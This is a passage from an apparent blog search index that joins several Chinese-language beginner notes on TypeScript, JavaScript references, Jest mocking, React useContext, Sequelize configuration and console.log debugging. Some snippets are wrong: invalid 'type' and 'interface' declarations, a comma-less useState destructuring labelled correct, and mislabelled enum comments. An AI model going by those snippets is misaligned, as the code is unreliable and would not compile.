Invoice('peanu', 'bicycle', 300)const invoiceTwo = new Invoice('ppb', 'phone', 100)const invoices: Invoice[] = []invoices.push(invoiceOne, invoiceTwo)invoices.forEach((inv) =&gt; { console.log(inv.details, inv.amount, inv.format())}) 在沒有指定任何關鍵字時，class 中的每個屬性預設都是 public，代表不論是 instance 還是 class 本身都可以去 Read &amp; Write。 private 是只有 class 可以 Read &amp; Write，readOnly 則是 instance 和 class 都只能 Read。 泛型（Generics）泛型對我來說是一種「沒有明確指定，但又不希望是 any 的 type」，先來看個範例。 假設有一個 function 是專門用來加上 uid 屬性，然後預期會接收「物件」的 type： 1234const addUID = (obj: object) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }} 看起來沒什麼問題，可是當你寫成這樣時就會得到一個錯誤： 12345678910111213const addUID = (obj: object) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}const newMe = addUID(me)// Property 'name' does not exist on type '{ uid: number; }console.log(newMe.name) 為什麼會這樣？這裡要先知道 TS 有一個「自動判斷」的機制，就是像我們宣告 let a = '123' 時他會自動判斷 a: string 的功能。 而剛剛的範例中我們只有指定 obj: object，並且最後把 {...obj, uid} 回傳出去。 問題就出在這邊，TS 怎麼會知道 object 長怎樣？他唯一能知道的就是一定會有 uid 這個屬性，因為他是寫死的。 所以這時候就可以用「泛型」的方式來改寫： 12345678910111213141516// 預期在呼叫這個 function 時會傳入 Type// 這個 &lt;T&gt; 就會變成 (obj: T) 的類別const addUID = &lt;T&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}// 這邊沒有指定 &lt;T&gt;，所以會自動把 me 的內容當作 &lt;T&gt;const newMe = addUID(me)// 這樣就能夠存取，而且還會自動彈出對應的 popupconsole.log(newMe.name) 這邊我還是不太熟，不過我是這樣記的： &lt;T&gt; 我要用泛型來指定 type (obj: T) 意思是 obj 的 type 會根據「我」或「自動判斷」指定的 &lt;T&gt; 來決定 可是我只希望她就是 object 該怎麼辦？你可能會以為要這樣寫： 12345678910111213const addUID = &lt;T&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}// 指定為 objectconst newMe = addUID&lt;object&gt;(me)// Property 'name' does not exist on type 'object &amp; { uid: number; }'console.log(newMe.name) 這樣是不對的，這樣就變成最一開始的意思了。 如果你真的希望 &lt;T&gt; 要侷限在某個範圍中，可以用 extends 的方式來指定： 123456789101112const addUID = &lt;T extends object&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}const newMe = addUID(me)console.log(newMe.name) 當然，你也可以用超嚴格的方式來指定： 123456789101112131415161718interface Person { name: string age: number}// 侷限在 Person 這個 typeconst addUID = &lt;T extends Person&gt;(obj: T) =&gt; { const uid = Math.floor(Math.random() * 100) return { ...obj, uid }}const me = { name: 'peanu', age: 24}const newMe = addUID(me)console.log(newMe.name) 這樣子也不是不行，只是就失去了泛型的意義了，因為這跟 obj: Person 的意思沒兩樣，所以通常不會用這麼嚴格的方式來指定 type。 最後在附上一個示範，我想提醒的是泛型並不是只能用在 function 上，他可以應用在各種地方，像是 interface、type 和 class 等等。 123456789101112131415161718192021222324252627282930interface Live&lt;T&gt; { title: string address: string url: string date: T // 可能希望是 object, array, string etc...}// &lt;T&gt; = Dateconst live1: Live&lt;Date&gt; = { title: \"Peanu's birthday\", address: 'internet', url: 'https://birthday.com', date: new Date()}// &lt;T&gt; = stringconst live2: Live&lt;string&gt; = { title: \"Peanu's birthday\", address: 'internet', url: 'https://birthday.com', date: '2022-07-12'}// &lt;T&gt; = numberconst live3: Live&lt;number&gt; = { title: \"Peanu's birthday\", address: 'internet', url: 'https://birthday.com', date: 20220712} 補充順道一提，如果你是在 React 的 Component 中使用泛型的話，要盡量避免用 arrow function 來定義，因為會跟 JSX 的 &lt;&gt; 搞混。 Do this： 123function Table&lt;Titem&gt;(props: TableProps&lt;Titem&gt;) { return null} Not this： 1234// 無法區分是 JSX 還是泛型const Table = &lt;Titem&gt;(props: TableProps&lt;Titem&gt;) =&gt; { return null} Enum簡單來說就是「代號」 1234567891011121314151617181920212223242526272829303132// 每個代號會對應到的值enum Status { SUCCESS = 1, ERROR = -1, FAIL = 0}interface Live { title: string streammer: string time: number status: Status}const live1: Live = { title: 'PeaNu Birthday', streammer: 'PeaNu', time: Date.now(), status: Status.SUCCESS // 1}const live2: Live = { title: 'PeaNu Birthday', streammer: 'PeaNu', time: Date.now(), status: Status.FAIL // 1}const live3: Live = { title: 'PeaNu Birthday', streammer: 'PeaNu', time: Date.now(), status: Status.ERROR // 1} 這樣寫的目的是當有一堆代號時比較不會混亂，不過要注意編譯完的結果一樣會是代號，這只是讓開發的時候比較好讀而已。 把 Object 從 Array 抽出來的方法之前突然有這個需求，所以記錄一下，詳細可以參考這篇 12345export interface Cache { events: Event[] users: User[]}type CacheType = Event[] | User[] 1type Unpacked&lt;T&gt; = T extends (infer U)[] ? U : T 1type InnerCacheType = Unpacked&lt;CacheType&gt; // Event | User 想知道原理的話可以再參考這篇","link":"/2022/07/21/typescript-review-and-note/"},{"title":"從 Object 的等號來真正理解變數","text":"變數真的是你想像中的那個變數嗎？ 變數儲存的到底是什麼？如題，因為是筆記向所以就不花太多時間鋪成。所以就開門見山的說了： 變數可以儲存的值有兩種 一種是「東西本身」，一種是「記憶體位址」。 先測試看看你能不能回答出下面的問題： 1234console.log([] === [])console.log([0] === [0])console.log({} === {}) console.log({a: 1} === {a: 1}) 如果你的回答是：false false false false，那恭喜你，你是對的。 來看看為什麼吧，先讓我們看另外一個例子： 123var obj1 = {a: 1}var obj2 = {a: 1}console.log(obj1 === obj2) 最後會輸出的結果會是 false。 你可能會很疑惑，想說不是應該會像這樣子嗎： 123var a = 5var b = 5console.log(a === b) // true 明明都是把東西存到變數裡面，為什麼 存的東西不一樣 會有不同的結果？ 你可以參考下面兩張圖。 在你儲存數字的時候，其實是這樣子： 但你儲存物件的時候，卻是這樣子： 0x01 跟 0x05 是記憶體位址的編號，我習慣叫它「指標」（在 C 語言裡是這樣稱呼的） 所以理解這兩個差異後，這樣就說得通了。當你寫 obj1 === obj2 時，其實是等於在問「0x01 === 0x05 嗎？」，這種感覺。 當然，0x01 跟 0x05 顯然是兩個不同的東西。 所以，當變數儲存的東西不是 String、Boolean、Number、undefined、null 時，都是採用物件這種儲存「指標」的方式來存東西。 undefined 跟 null 也是用「放東西」的方式儲存哦，特別做個範例提醒自己： 123456var a = undefinedvar b = undefinedvar c = nullvar d = nullconsole.log(a === b) // trueconsole.log(c === d) // true 什麼是參考值？不知道你有沒聽過一種說法：物件儲存的是一個參考值 以前我覺得這個說法很抽象，但其實概念很簡單，讓我們看個例子： 1234var obj1 = {a: 1}var obj2 = obj1 obj2.a = 10console.log(obj1.a === obj2.a) 如果前面講的東西你有理解的話，應該能猜到這題的結果是 true 一樣來看圖說故事： 在你做 obj2 = obj1 時，可以想成是 obj2 = 0x01 這個意思，obj2 儲存的這個值就是我們一開始提到的那個「參考值」。 所以 obj2.a = 10 的意思其實是「把 0x01 裡面的 a 改成 10」的意思，這也解釋為什麼 obj1.a === obj2.a 會得到 true，因為改的就是同一個東西。 為了讓你把變數的觀念學好，現在再來考你一題： 1234var obj1 = {a: 1}var obj2 = obj1 obj2 = {a: 10}console.log(obj1.a === obj2.a) // true ? false ? 答案是 false。 其實在 obj2 = {a: 10} 這行指令被執行之前，obj1 跟 obj2 的關係就跟剛剛畫的圖片是一樣的。 可是當這行指令被執行後，發生了這件事： 簡單來說，會有這樣的差異是因為「賦值對象」不同的關係： obj2.a = 10 賦值的對象是「0x01 裡面的 a」 obj2 = {a: 10}賦值的對象是「obj2」 所以最後才會有這樣不同的結果。 忘了提那個跟 Object 搞曖昧的傢伙（Array）Array 其實就是物件的一種，不信的話自己 typeof === []。 所以它的變數儲存方式就跟物件一模一樣，來看些例子： 123456var arr1 = [1]var arr2 = arr1 arr2.push(3)console.log('arr1: ' + arr1) // arr1: 1,3console.log('arr2: ' + arr2) // arr2: 1,3console.log(arr1 === arr2) // true 它的行為就跟前面的圖一樣，我懶得畫了，忘記了可以自己拉回去上面看。 再來一個例子： 12345678var arr1 = []var arr2 = arr1arr2.push(1)arr2 = [1, 2, 3]console.log(arr1) // [1]console.log(arr2) // [1, 2, 3]console.log(arr1 === arr2) // false 這題也理解的話就沒什麼問題了。 總結最後總結一下幾個雷點： 賦值給變數值，要搞清楚它存的是「東西本身」，還是「參考值」？ 對一個變數重新賦值時，要搞清楚你「賦值的對象是誰？」是「變數本身」，還是「參考值裡的東西」","link":"/2021/12/16/understand-variable-from-object/"},{"title":"再探 TypeScript","text":"希望能越來越熟悉。 簡述繼上次寫完 TtypeScript 基礎後，又做了一個 Todo-list 來練習。這篇筆記是用來把我原本沒很懂的地方弄得更清楚一些。 錯誤訊息 1 123456789function App () { return ( &lt;&gt; &lt;TodoListItem /&gt; &lt;/&gt; )}export default App; 這個的意思是說，TodoListItem 裡面有設定會接收到 todo 這個 props，但你沒有給他。 TodoListItem 的內容： 1234567891011121314151617181920import React from \"react\";// 接收的 props，預期會有一個 todo// todo 的內容則是 Todo（interface）interface Props { todo: Todo}// 1. 指定 type 為 React.FC// 2. 用泛型告訴他我希望 type 是 Props interface 的內容export const TodoListItem: React.FC&lt;Props&gt; = ({ todo }) =&gt; { return ( &lt;li&gt; &lt;label style={{ textDecoration: todo.complete ? 'line-throght' : undefined }}&gt; &lt;input type=\"checkbox\" checked={todo.complete} /&gt; &lt;/label&gt; &lt;/li&gt; )} 錯誤訊息 2 這個意思就是你沒有幫他指定 type 的意思。 Type Declaration File一個小技巧，你可以建立 *.d.ts 的檔案來當作 type 的宣告（因為編譯器會自動判斷），這樣子就不用再透過 module 來 import / export 使用。 Array 與 Object資料型態是 Array 的話，除了告訴 TS 是陣列以外，還要順便告訴它值的 type 是什麼，像這樣： 1234// 一維陣列，值為 stringlet arr1: string[] = ['a', '123'];// 二維陣列，且值為 stringlet arr2: string[][] = [['a'], ['b']]; 如果是 Array 包 Object 的話，可以先自定義一個 type，再把它設為 Array 的值： 12345678910111213141516// 也可以 interface，記得分清楚差異就好type Todo { id: number, name: string, isDone: boolean}// type 是 Array，而值是 Todo（上面寫的）const todos: Todo[] = [ { id: 0, name: 'todo1', isDone: true }] 至於 Object 的話通常會用 type 或 interface 來描述： 123456789101112131415161718type Card1 = { name: string, des: string,}interface Card2 { name: string, des: string,}const obj1: Card1 = { name: \"PeaNu\", des: \"hello\",};const obj2: Card2 = { name: \"PeaNu\", des: \"hello\",} 如果要決定 Object 的 key 跟 value 值，這邊提供一個範例： 假設我希望一個 Object 的值如下： 1234567891011121314const obj = { username: [ { required: true, message: \"Pleaase enter your username\", }, ], password: [ { required: true, message: \"Please enter your password\" } ]} 那他的 type 就會這樣設： 1234567891011121314151617181920type Rules = { required: boolean, message: string}// { [key]: value }const rules: { [key: string]: Rules[] } = { username: [ { required: true, message: \"Pleaase enter your username\", }, ], password: [ { required: true, message: \"Please enter your password\" } ]} 至於 key 用 [] 包住是因為我們在存取屬性時會這樣寫 obj[key]，只要這樣子想就不會覺得困惑了。 Functionfunction 可以指定兩個東西： 參數 回傳值 簡單示範一下 normal 跟 arrow 的差別： 12345678910const logContent = (content: string): void =&gt; { console.log(content)}function logContent2 (content: string): void { console.log(content);}logContent(\"test1\");logContent2(\"test2\"); 除了設定型別以外，也可以設定參數的值必須是什麼： 12345678// 指定值必須是 A 或 Bfunction getItem (key: 'A' | 'B'): void { console.log(key)}getItem('A');getItem('B');getItem('C'); // 這個不可以 as 的用法它不是用在變數身上，而是用在某個值，第一種是 「API response」： 123456async function getData() { const res = await fetch('https://jsonplaceholder.typicode.com/todos/1'); // 如果沒有 as Data，就會被當作 any const data = await res.json() as Data; console.log(data);} 第二種是用在「變數賦值」： 123456789101112const data1: Data = { \"userId\": 1, \"id\": 1, \"title\": \"delectus aut autem\", \"completed\": false}type Data2 = { name: string}const data2 = data1 as unknown as Data2; 如果直接把 data1 賦值給 data2，那 data2 就會繼承 data1 的 type （Data）。 不希望這樣的話就得用 as 來「斷言」，這邊是把它斷言為 Data2 這個 type。當然，也可以斷言成一般的 string、number 等等。 React 的小提醒 Props 需要定義 type 123456789101112131415161718192021222324252627// 以下那兩個 type 基本上會寫在 *.d.ts 檔案裡// 現在只是為了方便理解才寫在這// 接收到的 todotype Todo = { id: number, name: string, isDone: boolean}// 接到的 functiontype LogMessage = (msg: string) =&gt; void;// 寫好會接收到的 propsinterface Props = { // 1. todo，且它的 type 是上面定義好的那個 todo: Todo, // 2. logMessage，同上 logMessage: LogMessage}const TodoItem: React.FC&lt;Props&gt; = ({ todo, logMessage }) =&gt; { return ( &lt;&gt; &lt;li&gt;{todo.name}&lt;/li&gt; &lt;button onClick={logMessage}&gt;log message&lt;/button&gt; &lt;/&gt; )} 在 Component 中定義的 function / variable 都要記得給 type 1234567891011121314import React from \"react\";const TestCom: React.FC = () =&gt; { // 變數 const a: string; // 函式（參數、回傳值） const handleSomething = (value: string): void =&gt; { console.log(value); } return (&lt;h1&gt;Test Component&lt;/h1&gt;)}export default TestCom 關於 Event 的 type 如果是 inline function 的話可以不用幫 event 加上 type： 12345678910111213export const AddTodoFrom: React.FC&lt;Props&gt; = ({ addTodo }) =&gt; { const [value, setValue] = useState(\"\"); return ( &lt;form onSubmit={e =&gt; { e.preventDefault(); addTodo(value); setValue(\"\"); }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; )} 可是如果不是的話，就要用這種形式來代表： 123456789101112131415export const AddTodoFrom: React.FC&lt;Props&gt; = ({ addTodo }) =&gt; { const [value, setValue] = useState(\"\"); // 指定 type const handleSubmit = (e: React.FormEvent&lt;HTMLFormElement&gt;) =&gt; { e.preventDefault(); addTodo(value); setValue(\"\"); } return ( &lt;form onSubmit={handleSubmit}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; )}","link":"/2022/05/11/typescript-review/"},{"title":"一個做 Unit test 可能會用到的方法","text":"做作業時學到的，所以想記一下。 簡述 SUT 與 DOC這邊先介紹兩個專有名詞： SUT（System Under Test） DOC（Depended-on Component） 簡單來說 SUT 可以想成是真正要測試的「目標」，而 DOC 則是用來「協助目標」的其他東西。 這樣講可能有點抽象，所以直接來舉個例子： 123456function forEach(array, callback) { for (const item of array) { callback(item) }}module.exports = forEach 就是一個簡單的 forEach。 這時候我們可能會想測試 forEach 的運作是否正常，不過它顯然需要一個 callback 來輔助執行。這時候就可以把 forEach 當作是 SUT，而 callback 則是 DOC。 為什麼要這樣分？因為我們其實真正想測試的是 forEach，不是 callback，但如果 callback 出了一點問題可能就會連帶影響到 forEach 的結果，這樣不是很好。 所以才會利用這種方式來切割出「最小單位」，讓 A 跟 B 之間不要互相影響。 mock function 替身函式前面的舖陳就是為了介紹「Mock」這個東西。 Mock 的中文翻作「模擬、模仿」，在 Unit test 裡面我們會把 Mock 想成是一種「替身函式」。藉由這個替身函式來協助我們真正想測試的 function。 以上面 forEach 的例子來說，我們就會生一個 Mock 出來，當作 callback 的替身。 這邊不會講太深，只會紀錄一下我目前學到的用法，想知道更多可以參考 官方文件。 總之呢，在實際應用以前，先介紹一下在 jest 裡使用 Mock 的基本用法。 開啟方式jest.fn() 123456it('should return undefined', () =&gt; { // 建立一個 Mock const mockFunction = jest.fn() // 預設的回傳值為 undefined，就跟 call 一般的 function 一樣 expect(mockFunction()).toBe(undefined)}) 指定回傳值 mockReturnValueOnce 一次 mockReturnValue 永遠 1234567891011121314151617181920212223242526272829303132333435it('should return true only in first call', () =&gt; { const mockFunction = jest.fn() // 只有第一次 call 會回傳 true mockFunction.mockReturnValueOnce(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(undefined) expect(mockFunction()).toBe(undefined) expect(mockFunction()).toBe(undefined)})it('should always return true', () =&gt; { const mockFunction = jest.fn() // 只有第一次 call 會回傳 true mockFunction.mockReturnValue(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(true)})it('should return true, false, false and true', () =&gt; { const mockFunction = jest.fn() // 第一次回傳 true // 第二次回傳 false // 第三次回傳 false // 第四次回傳 true mockFunction .mockReturnValueOnce(true) .mockReturnValueOnce(false) .mockReturnValueOnce(false) .mockReturnValueOnce(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(false) expect(mockFunction()).toBe(false) expect(mockFunction()).toBe(true)}) Mock 的實際應用檢查 Mock 被 call 了幾次mockFunction.mock.calls.length 1234567it('mock function should be call two times', () =&gt; { // 把這個 mock 當成 callback const mockFunction = jest.fn((x) =&gt; x + 1) forEach([1, 2, 3], mockFunction) // mock 應該要被執行三次 expect(mockFunction.mock.calls.length).toBe(3)}) 檢查 Mock 是怎麼被呼叫的toHaveBeenCalledWith 1234567it('mock function should be call with an argument', () =&gt; { const mockFunction = jest.fn((x) =&gt; x + 1) forEach(['A'], mockFunction) // 可以想成是這樣：mock.call(this, 'A') // 就是 mock 是怎麼被呼叫的意思 expect(mockFunction).toHaveBeenCalledWith('A')}) 檢查 Mock 每一次是怎麼被呼叫的toHaveBeenNthCalledWith 12345678it('mock function should be call with each element', () =&gt; { const mockFunction = jest.fn((x) =&gt; x + 1) forEach(['A', 'B', 'C'], mockFunction) // mock 的每一次是怎麼被 call 的 expect(mockFunction).toHaveBeenNthCalledWith(1, 'A') expect(mockFunction).toHaveBeenNthCalledWith(2, 'B') expect(mockFunction).toHaveBeenNthCalledWith(3, 'C')}) 檢查 Mock 被呼叫時的參數資訊123456789101112131415161718192021it('mock function should be call with each element', () =&gt; { const mockFunction = jest.fn() const array = [ { name: 'PeaNu', age: 20 }, { name: 'PPB', age: 18 }, { name: 'ET', age: 100 } ] forEach(array, mockFunction) // calls[0]: 第一次執行的參數資料 // calls[0][0]: 第一次執行的第一個參數 // calls[0][0]['name']: 第一次執行的第一個參數的 name 屬性 expect(mockFunction.mock.calls[0][0]['name']).toBe('PeaNu') expect(mockFunction.mock.calls[0][0]['age']).toBe(20) expect(mockFunction.mock.calls[1][0]['name']).toBe('PPB') expect(mockFunction.mock.calls[1][0]['age']).toBe(18) expect(mockFunction.mock.calls[2][0]['name']).toBe('ET') expect(mockFunction.mock.calls[2][0]['age']).toBe(100)})","link":"/2022/03/22/unit-test-methods/"},{"title":"第一次做 Unit test","text":"好像很厲害的感覺。 單元測試在做什麼？單元測試也可以稱為「模組測試」。 一個程式可以劃分成很多個小單位，function 就是其中之一。 而 unit test 要做的事情是，測試每一個 function 的正確性，並確保每一個小的單位（unit）都沒有錯。 另外，這篇筆記的內容是以 jest 來做測試。 基本用法Step1 把你要測試的 function 給輸出12345678910// index.jsfunction repeat(str, times) { let result = '' for (let i = 0; i &lt; times; i++) { result += str } return result}// 輸出模組module.exports = repeat 簡單來說，這個 function 的回傳值是「n 個新字串」 Step2 建立 index.test.js 測試執行檔一般測試執行檔都會把 .test.js 當做後綴檔名。可以算是個約定俗成，盡量維持這個習俗。 另外如果你剛好也有檔案叫 test.js 的話，會被誤以為是測試執行檔而一起被執行，要多注意。 Step3 撰寫測試內容有不懂的就參考 README 上的說明，這裡就簡單示範一下： 1234567891011121314151617// index.test.jsconst repeat = require('./repeat') // 引入要測試的模組describe('測試 repeat', () =&gt; { test('結果應該要是 aaaaa', () =&gt; { expect(repeat('a', 5)).toBe('aaaaa') }) test('結果應該要是 \"\"', () =&gt; { expect(repeat('a', 0)).toBe('') }) test('結果應該要是 abcabc', () =&gt; { expect(repeat('abc', 2)).toBe('abcabc') }) test('結果應該要是 \"\"', () =&gt; { expect(repeat('', 5)).toBe('') })}) describe(message, function) 是用來把一個要測試的群組給包起來，這樣在結構上會比較好。message 可以填入跟這個群組有關的名稱，function 裡面會放要測試的所有項目。 test(message, function) 是用來執行測試函式，message 可以填入這個函式要測試什麼？ expect(received).toBe(expected) received 放你要執行的函式，expected 填預期的輸出結果。 Step4 執行測試執行檔特別注意，因為 jest 是安裝在專案底下，所以沒辦法直接在 terminal 上用這個指令，必須透過 npm script 或 npx jest 來執行，詳細可以參考 npm script 與 npx 的用途。 成功執行後就能看到結果如下： 如果有發現錯誤的結果： 補充當想要檢查的值是陣列 or 物件的話，要改用 toEual 不是 toBe。這樣就會檢查裡面的每一個值是否相同，而不是檢查記憶體位置。 1234567// myFunction 會回傳 [1, 2, 3]const myFunction = require('./myfunction')describe('複習 jest', () =&gt; { test('is array === [1, 2, 3] ?', () =&gt; { expect(myFunction()).toBe([1, 2, 3]) })}) 改成 toEqual 就正確了： 1234567// myFunction 會回傳 [1, 2, 3]const myFunction = require('./myfunction')describe('複習 jest', () =&gt; { test('is array === [1, 2, 3] ?', () =&gt; { expect(myFunction()).toEqual([1, 2, 3]) })}) 總結第一次寫單元測試還蠻有趣的，以前也是很常聽到 unit test 這個技術用語，但都不知道實際上在做什麼，今天算是解決這個疑惑了，也學到一項新的技能，開心！","link":"/2021/12/24/unit-test/"},{"title":"使用 useContext 要注意的細節","text":"隔了一天才搞清楚。 簡述當時的情境是我想在 App 包裹一層 &lt;Loading.Provider&gt;，接著再透過子元件去呼叫 setIsLoading 來更新 state，像這樣： 12345678910111213141516171819202122232425262728293031const [isLoading, setIsloading] = useState(false);return ( &lt;ThemeProvider theme={theme}&gt; &lt;GlobalStyle /&gt; {/* loading context */} &lt;Loading.Provider value={[isLoading, setIsloading]}&gt; &lt;AuthContext.Provider value={{ user, setUser }}&gt; &lt;Router&gt; &lt;NavBar /&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;HomePage /&gt;} /&gt; &lt;Route path=\"/about\" element={&lt;AboutPage /&gt;} /&gt; &lt;Route path=\"/categories\" element={&lt;CategoriesPage /&gt;} /&gt; &lt;Route path=\"/posts\" element={&lt;PostsPage /&gt;} /&gt; &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;Route path=\"/log-in\" element={&lt;LoginPage /&gt;} /&gt; &lt;Route path=\"/sign-up\" element={&lt;SignUpPage /&gt;} /&gt; &lt;Route path=\"/test\" element={&lt;TestPage /&gt;} /&gt; &lt;/Routes&gt; {/* loading component */} &lt;StyledLoader active={isLoading} spinner={true} text=\"Loading your content...\" &gt;&lt;/StyledLoader&gt; &lt;/Router&gt; &lt;/AuthContext.Provider&gt; &lt;/Loading.Provider&gt; &lt;/ThemeProvider&gt;) 接著我在子元件裡面這樣寫： 123456789101112131415161718export default function HomePage() { const [isLoading, setIsLoading] =useContext(Loading) const [posts, setPosts] = useState([]); // 一進來就打開 loading 畫面 setIsLoading(true); useEffect(() =&gt; { getAllPosts().then((data) =&gt; { setPosts(data); // 拿到 API 資料後再關閉 setIsLoading(false); }); }, [setIsLoading]); // ... 略} 接著就噴錯誤了： Warning 的大意是說我不應該在 render 子元件的時候去更新 state。我一開始沒有很懂這什麼意思，不過後來仔細想一下流程後就明白了。 總之這是因為我在 render 子元件的時候去更新了 state，這時候就會觸發 App 重新 render，然後 render 子元件的時候又再更新了 state，觸發 App 重新 render … 大概就跟這張圖的意思一樣： 所以要避開這種： 在 render 時更新 state 的行為 在 render 時更新 state 的行為 在 render 時更新 state 的行為 這個真的很重要QQ，請務必搞清楚。 最後呢，這個範例的正確做法應該是這樣： 12345678useEffect(() =&gt; { // 當 render 完以後才執行。 setIsLoading(true); getAllPosts().then((data) =&gt; { setPosts(data); setIsLoading(false); });}, [setIsLoading]); // 只有在 setIsLoading 改變時，這個 Effect 才會再次執行 希望以後別再踩到同樣的雷。","link":"/2022/04/12/use-context-problem/"},{"title":"在 Seuqelize 中使用環境變數的方式","text":"只是個設定，但卻踩了不少雷。 簡述首先來看一下 官方的教學 是怎麼說的： This is a special configuration file. It lets you specify the following options that you would usually pass as arguments to CLI: Some scenarios where you can use it: You want to override default path to migrations, models, seeders or config folder. You want to rename config.json to something else like database.json And a whole lot more. Let’s see how you can use this file for custom configuration. To begin, let’s create the .sequelizerc file in the root directory of your project, with the following content: 123456789// .sequelizercconst path = require('path');module.exports = { 'config': path.resolve('config', 'database.json'), 'models-path': path.resolve('db', 'models'), 'seeders-path': path.resolve('db', 'seeders'), 'migrations-path': path.resolve('db', 'migrations')}; With this config you are telling the CLI to: Use config/database.json file for config settings; Use db/models as models folder; Use db/seeders as seeders folder; Use db/migrations as migrations folder. OK，簡單來說就是在你的專案根目錄寫一個 .sequelizerc 的設定檔，裡面可以指定 config / model 和 seed 的路徑位置。 但我試過了，沒有用就是沒有用。 我爬過 Stackoverflow 也爬過 GitHub issue，有人說要把 .sequelizerc 放在「不是根目錄的位置」才讀的到，這個我也試過，一樣沒效。所以等一下會解釋我最後是怎麼解決的。 真正的解法首先第一步是先去改寫原本用 sequelize-cli init 後產生的 config.json。 改這個是因為我們希望在裡面使用環境變數，但 JSON 只能寫純文字沒辦法寫變數，所以得先把它變成 config.js，再搭配 dotenv 來使用。總而言之，寫好的內容大概會是這樣： 12345678910111213141516171819202122232425262728// config/json -&gt; config.jsrequire('dotenv').config(); // &lt;- 記得一定要引入，不然你沒辦法用module.exports = { \"development\": { \"username\": process.env.DB_USERNAME, // 方法一 \"password\": process.env.DB_PASSWORD, // 方法一 \"database\": process.env.DB_DATABASE, // 方法一 \"host\": \"127.0.0.1\", \"dialect\": \"mysql\", \"use_env_variable\": \"DB_URL\" // 方法二 }, \"test\": { \"username\": \"root\", \"password\": null, \"database\": \"database_test\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\" }, \"production\": { \"username\": \"root\", \"password\": null, \"database\": \"database_production\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\" }} 如果有專心看註解應該就會注意到有兩種寫法，第一種是把資料分別填入到每個欄位，第二種是透過 use_env_variable（Sequelize 提供的另一種格式）來設定。這兩種我測試結果都是 OK 的，所以看你喜歡用哪個就用哪個吧。 不過特別強調一下，use_env_variable 要填入的值是「環境變數的名稱」，不是「你想傳入的值」。這個要搞清楚，不要像我一樣傻傻的。 接下來是下一個步驟，如果按照剛剛的官方說明你得去新建一個 .sequelizerc 然後設定 config 去讀取剛剛寫好的 config.js，不過我一開始說過了這對我無效。 我的做法是直接到 ./models/index.js 改內容： 123456789'use strict';const fs = require('fs');const path = require('path');const Sequelize = require('sequelize');const basename = path.basename(__filename);const env = process.env.NODE_ENV || 'development';// 原本是引入 config.json，直接改成 config.jsconst config = require(__dirname + '/../config/config.js')[env]; 當時為了研究這東西還特地花時間看一下這整段 code 是在幹嘛用的，有興趣知道的話可以參考這篇：從解讀 Sequelize 的執行檔來學習 Node.js 的檔案相關 API 總而言之，把這個路徑指向你的設定檔就好了。如果讀取不到通常是你路徑寫錯了，可以用 console 印出來檢查看看。 沒意外的話，到這一步就全部設定好了，恭喜恭喜。","link":"/2022/04/03/use-env-in-seuqelize/"},{"title":"善用 console.log 來除錯","text":"最簡單又暴力的方式。 加 log 的眉角？一般會把 log 加在你覺得「最有可能出問題的地方」，但如果一時想不到該加在哪裡，有一個最簡單的方式：通通給他加爆。 把你想要得到的資訊都給 log 出來，像是 迴圈次數，變數值，進入的條件判斷 等等之類。 案例一以下是一個判斷質數的函式，但因為邏輯不正確，所以會得到錯誤的結果： 123456789101112function isPrime(num) { if (num === 1) return false if (num === 2) return true for(var i=2; i&lt;num; i++) { if(num % i === 0) { return false } else { return true } }}console.log(isPrime(25)) // true 為了釐清問題，可以善用 log 來檢查： 12345678910111213141516function isPrime(num) { console.log('num:', num) if (num === 1) return false if (num === 2) return true for(var i=2; i&lt;num; i++) { console.log('i:', i) if(num % i === 0) { console.log('num % i === 0', num, i) return false } else { console.log('else', num, i) return true } }}console.log(isPrime(25)) // true 輸出結果： 1234num: 25i: 2else 25 2true 這時候問題就一目了然了。 當 25 進入迴圈中的條件判斷 num % i === 0 時沒通過，所以進到 else 區塊，這個時候就直接 return true，25 被視為質數。 但重點來了，質數的定義是「比自己小的所有數字都無法整除」。所以即便 25 不能被 2 整除，也不代表它就是質數，因為還有 3, 4, 5, … 24 可以測試。 所以這個範例的問題在於﹔「else 應該寫在迴圈的外面」，才能得到正確的結果。 案例二這是我曾經自己把 += 寫成 = 產生的 bug。 正確的結果應該要是「轉成小寫的字串」： 12345678910const str = 'AbCdEFGhijkLMN'var result = ''for(var i=0; i&lt;str.length; i++) { if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') { result = String.fromCharCode(str[i].charCodeAt(0) + 32) } else { result = str[i] }}console.log(result) 最後得到的結果是 n，為什麼？我們來 log 看看： 123456789101112131415const str = 'AbCdEFGhijkLMN'var result = ''for(var i=0; i&lt;str.length; i++) { console.log('i:', i) console.log('str:', str[i]) if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') { console.log('&gt;=A and &lt;=Z:', str[i]) result += String.fromCharCode(str[i].charCodeAt(0) + 32) console.log('result:', result) } else { console.log('else:', str[i]) result += str[i] console.log('result:', result) }} 12345678910111213141516i: 0str: A&gt;=A and &lt;=Z: Aresult: ai: 1str: belse: bresult: b...i: 13str: N&gt;=A and &lt;=Z: Nresult: n 從輸出結果就能很清楚的看到問題點，因為每一圈 result 都被 = 給重新賦值，所以在最後一圈的時後 result 被賦值為 n，得到了最後的結果。 所以正確的作法是用 += 來做字串拼接，而不是用 = 來重新賦值。 結束！","link":"/2021/12/20/use-log-to-debug/"},{"title":"使用 useState 要注意初始值的設定","text":"筆記起來。 簡述就算是空字串也記得要傳值，不可以不填： 12const [value setValue] = useState(); // 錯誤const [value setValue] = useState(''); // 正確 